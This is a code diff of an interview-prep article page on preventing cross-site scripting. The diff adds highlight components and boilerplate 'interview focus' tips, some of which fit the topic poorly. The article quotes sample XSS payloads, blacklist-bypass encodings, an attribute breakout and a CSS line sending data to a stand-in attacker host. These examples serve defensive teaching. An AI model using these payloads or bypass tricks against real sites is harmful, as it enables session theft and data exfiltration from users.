@@ -2,6 +2,7 @@
 
 import { ArticleLayout } from "@/components/articles/ArticleLayout";
 import { ArticleImage } from "@/components/articles/ArticleImage";
+import { HighlightBlock } from "@/components/articles/HighlightBlock";
 import type { ArticleMetadata } from "@/types/article";
 
 export const metadata: ArticleMetadata = {
@@ -27,20 +28,23 @@ export default function ArticlePage() {
           ============================================================ */}
       <section>
         <h2>Definition and Context</h2>
-        <p>
+        <HighlightBlock as="p" tier="crucial">
+          Interview focus: define the constraint/goal and name the 2–3 variables that actually drive design decisions in production.
+        </HighlightBlock>
+        <HighlightBlock as="p" tier="important">
           <strong>XSS (Cross-Site Scripting)</strong> is a vulnerability that allows an attacker to inject malicious
           scripts into web pages viewed by other users. When a user visits the compromised page, the malicious script
           executes in their browser with the same privileges as the legitimate page — allowing the attacker to steal
           session cookies, impersonate the user, modify page content, redirect to phishing sites, or perform any
           action the user is authorized to perform.
-        </p>
-        <p>
+        </HighlightBlock>
+        <HighlightBlock as="p" tier="important">
           XSS is consistently ranked as one of the most common and impactful web vulnerabilities. According to
           OWASP, XSS accounts for approximately 40 percent of all web application security vulnerabilities. XSS
           attacks are particularly dangerous because they execute in the victim&apos;s browser with the victim&apos;s
           authentication context — the server sees the requests as legitimate, and standard server-side security
           controls (authentication, authorization) cannot distinguish between legitimate and malicious requests.
-        </p>
+        </HighlightBlock>
         <p>
           There are three types of XSS: reflected XSS (the malicious script is reflected from the server&apos;s response,
           typically via a URL parameter), stored XSS (the malicious script is stored on the server, typically in a
@@ -82,20 +86,23 @@ export default function ArticlePage() {
           ============================================================ */}
       <section>
         <h2>Core Concepts</h2>
-        <p>
+        <HighlightBlock as="p" tier="crucial">
+          Interview focus: show you understand the primitives and which ones matter at scale (latency, correctness, UX, cost).
+        </HighlightBlock>
+        <HighlightBlock as="p" tier="important">
           Reflected XSS occurs when user input is reflected in the server&apos;s response without proper encoding. For
           example, a search page that displays the search query in the response: &lt;p&gt;Results for: USER_INPUT&lt;/p&gt;.
           If the user input is &lt;script&gt;alert(1)&lt;/script&gt; and the server reflects it without encoding, the script
           executes in the user&apos;s browser. Reflected XSS requires the victim to click a malicious link — the attack
           is not persistent and only affects users who click the link.
-        </p>
-        <p>
+        </HighlightBlock>
+        <HighlightBlock as="p" tier="important">
           Stored XSS occurs when user input is stored on the server (database, file system) and served to other users
           without proper encoding. For example, a comment system that stores user comments and displays them to all
           users who view the page. If an attacker submits a comment containing a malicious script, the script is
           stored and executed for every user who views the page. Stored XSS is more dangerous than reflected XSS
           because it affects all users who view the affected page, not just those who click a malicious link.
-        </p>
+        </HighlightBlock>
         <ArticleImage
           src="/diagrams/system-design-concepts/backend/security-authentication/xss-prevention-diagram-1.svg"
           alt="XSS attack types showing reflected, stored, and DOM-based XSS with their injection points and persistence"
@@ -144,22 +151,25 @@ export default function ArticlePage() {
           ============================================================ */}
       <section>
         <h2>Architecture and Flow</h2>
-        <p>
+        <HighlightBlock as="p" tier="crucial">
+          Interview focus: describe the end-to-end flow, where state lives, and where you add backpressure, caching, and observability.
+        </HighlightBlock>
+        <HighlightBlock as="p" tier="important">
           The XSS prevention architecture consists of the input validator (which validates and sanitizes user
           input), the output encoder (which encodes user input for the appropriate context), the CSP middleware
           (which sets the Content-Security-Policy header), and the safe DOM API library (which provides safe
           alternatives to innerHTML and document.write). The input validator rejects obviously malicious input,
           the output encoder encodes user input before rendering, the CSP middleware blocks script execution from
           untrusted sources, and the safe DOM API library prevents client-side XSS.
-        </p>
-        <p>
+        </HighlightBlock>
+        <HighlightBlock as="p" tier="important">
           The input validation flow begins with the user submitting input (form data, URL parameter, API request).
           The input validator checks the input against a whitelist of allowed patterns (alphanumeric characters,
           specific symbols) and rejects input that contains obviously malicious content (&lt;script&gt;, javascript:,
           event handlers). The validated input is then stored or processed. Input validation is the first line of
           defense but is not sufficient on its own — attackers can bypass input validation using encoding tricks
           (URL encoding, HTML entity encoding, Unicode encoding).
-        </p>
+        </HighlightBlock>
         <ArticleImage
           src="/diagrams/system-design-concepts/backend/security-authentication/xss-prevention-diagram-3.svg"
           alt="Context-aware output encoding showing different encoding strategies for HTML body, attributes, JavaScript, URL, and CSS contexts"
@@ -196,7 +206,10 @@ export default function ArticlePage() {
           ============================================================ */}
       <section>
         <h2>Trade-offs and Comparison</h2>
-        <p>
+        <HighlightBlock as="p" tier="crucial">
+          Decision rule: choose the approach that makes failure modes explicit and keeps the common path fast, while keeping correctness boundaries clear.
+        </HighlightBlock>
+        <HighlightBlock as="p" tier="important">
           Input validation versus output encoding is a trade-off between prevention and mitigation. Input validation
           prevents malicious input from entering the system — it rejects obviously malicious content before it is
           stored. Output encoding encodes user input before rendering — it prevents stored content from executing
@@ -204,15 +217,15 @@ export default function ArticlePage() {
           bypass it using encoding tricks). Output encoding is the primary defense but does not prevent malicious
           input from entering the system. The recommended approach is defense-in-depth — use both input validation
           and output encoding.
-        </p>
-        <p>
+        </HighlightBlock>
+        <HighlightBlock as="p" tier="important">
           CSP strict versus CSP relaxed is a trade-off between security and compatibility. A strict CSP
           (script-src &apos;self&apos;, no &apos;unsafe-inline&apos;, no &apos;unsafe-eval&apos;) blocks most XSS attacks but may break legitimate
           functionality (inline scripts, third-party widgets, analytics scripts). A relaxed CSP (allowing
           &apos;unsafe-inline&apos;, &apos;unsafe-eval&apos;, or specific third-party domains) maintains compatibility but provides less
           XSS protection. The recommended approach is to use a strict CSP with nonce-based or hash-based allowances
           for specific inline scripts — this provides strong XSS protection while allowing legitimate inline scripts.
-        </p>
+        </HighlightBlock>
         <p>
           Auto-escaping versus manual encoding is a trade-off between developer convenience and flexibility.
           Auto-escaping (templating engines that automatically encode all variables) is convenient — developers do
@@ -237,18 +250,21 @@ export default function ArticlePage() {
           ============================================================ */}
       <section>
         <h2>Best Practices</h2>
-        <p>
+        <HighlightBlock as="p" tier="crucial">
+          Interview focus: list the 3–5 non-negotiables you would enforce with tests, budgets, and monitoring.
+        </HighlightBlock>
+        <HighlightBlock as="p" tier="important">
           Use context-aware output encoding for all user input — encode user input differently depending on where
           it is placed in the HTML (HTML body, attributes, JavaScript, URLs, CSS). Use a well-tested encoding
           library (OWASP Java Encoder, ESAPI, DOMPurify) — do not implement your own encoding, as it is easy to
           make mistakes (missing characters, incorrect encoding for context).
-        </p>
-        <p>
+        </HighlightBlock>
+        <HighlightBlock as="p" tier="important">
           Enable Content Security Policy (CSP) with a strict policy — set script-src &apos;self&apos; to block inline
           scripts and external scripts from untrusted domains. Use nonce-based or hash-based allowances for
           specific inline scripts (script-src &apos;self&apos; &apos;nonce-abc123&apos;) rather than allowing &apos;unsafe-inline&apos;.
           Monitor CSP violation reports to detect potential XSS attacks.
-        </p>
+        </HighlightBlock>
         <p>
           Use safe DOM APIs — use textContent instead of innerHTML, createElement instead of document.write, and
           setAttribute instead of setting attributes directly. If you must use innerHTML (e.g., rendering rich text
@@ -279,19 +295,22 @@ export default function ArticlePage() {
           ============================================================ */}
       <section>
         <h2>Common Pitfalls</h2>
-        <p>
+        <HighlightBlock as="p" tier="crucial">
+          Interview focus: call out the top failure modes teams hit in production and how you prevent/mitigate them.
+        </HighlightBlock>
+        <HighlightBlock as="p" tier="important">
           Using blacklists for input validation is a common pitfall. Blacklists (blocking &lt;script&gt;, javascript:,
           onerror=) are easily bypassed — attackers can use encoding tricks (&#60;script&#62;, java&#115;cript:,
           onload=), alternative syntaxes (&lt;img src=x onerror=alert(1)&gt;), or case variations
           (&lt;ScRiPt&gt;). The fix is to use a whitelist approach — allow only expected patterns (alphanumeric
           characters, specific symbols) and reject everything else.
-        </p>
-        <p>
+        </HighlightBlock>
+        <HighlightBlock as="p" tier="important">
           Encoding in the wrong context is a common pitfall. User input placed in an HTML attribute but encoded
           for HTML body context is still vulnerable — an attacker can break out of the attribute using &quot; or &apos;
           and inject a malicious attribute (onerror=alert(1)). The fix is to use context-aware encoding — encode
           user input for the specific context where it is placed (HTML body, attribute, JavaScript, URL, CSS).
-        </p>
+        </HighlightBlock>
         <p>
           Allowing user-controlled CSS is a common oversight. User-controlled CSS can be used to exfiltrate data
           (background-image: url(attacker.com/steal?data=...)) or perform clickjacking attacks (positioning
@@ -317,21 +336,24 @@ export default function ArticlePage() {
           ============================================================ */}
       <section>
         <h2>Real-world Use Cases</h2>
-        <p>
+        <HighlightBlock as="p" tier="crucial">
+          Interview focus: connect the design to measurable outcomes (CWV, conversion, error rates) and operational practices.
+        </HighlightBlock>
+        <HighlightBlock as="p" tier="important">
           A large e-commerce platform uses auto-escaping templating engines (Twig) for its web application — all
           variables rendered in templates are automatically encoded for the appropriate context. The platform sets
           a strict CSP (script-src &apos;self&apos; with nonce-based allowances for specific inline scripts) and monitors CSP
           violation reports for potential XSS attacks. The platform also uses DOMPurify to sanitize user-generated
           rich text content (product reviews, descriptions) before rendering. The platform has had zero successful
           XSS attacks since implementing these controls.
-        </p>
-        <p>
+        </HighlightBlock>
+        <HighlightBlock as="p" tier="important">
           A social media platform uses DOMPurify to sanitize user-generated content (posts, comments, profiles)
           before storing it in the database. The platform&apos;s frontend framework (React) uses safe DOM APIs by
           default, preventing DOM-based XSS. The platform sets a strict CSP (script-src &apos;self&apos;, no &apos;unsafe-inline&apos;)
           and monitors CSP violation reports. The platform also implements a bug bounty program that rewards
           researchers for reporting XSS vulnerabilities.
-        </p>
+        </HighlightBlock>
         <p>
           A financial services company uses context-aware output encoding for its banking application — all user
           input is encoded for the specific context where it is placed (HTML body, attributes, JavaScript, URLs).
@@ -355,14 +377,17 @@ export default function ArticlePage() {
           ============================================================ */}
       <section>
         <h2>Interview Questions</h2>
+        <HighlightBlock as="p" tier="crucial">
+          Interview focus: answer with constraints, decisions, trade-offs, and how you’d validate/operate the system.
+        </HighlightBlock>
 
         <div className="space-y-5">
           <div className="rounded-lg border border-theme bg-panel-soft p-5">
             <h3 className="text-lg font-semibold mb-3">Question 1: What is the difference between reflected, stored, and DOM-based XSS?</h3>
-            <p className="text-muted mb-3"><strong>Answer:</strong></p>
-            <p className="mb-3">
+            <HighlightBlock as="p" tier="important" className="text-muted mb-3"><strong>Answer:</strong></HighlightBlock>
+            <HighlightBlock as="p" tier="important" className="mb-3">
               Reflected XSS occurs when user input is reflected in the server&apos;s response without proper encoding — the malicious script is delivered via a URL parameter and executes when the victim clicks the malicious link. It is not persistent and only affects users who click the link.
-            </p>
+            </HighlightBlock>
             <p className="mb-3">
               Stored XSS occurs when user input is stored on the server (database, file system) and served to other users without proper encoding — the malicious script is stored and executed for every user who views the affected page. It is persistent and affects all viewers.
             </p>
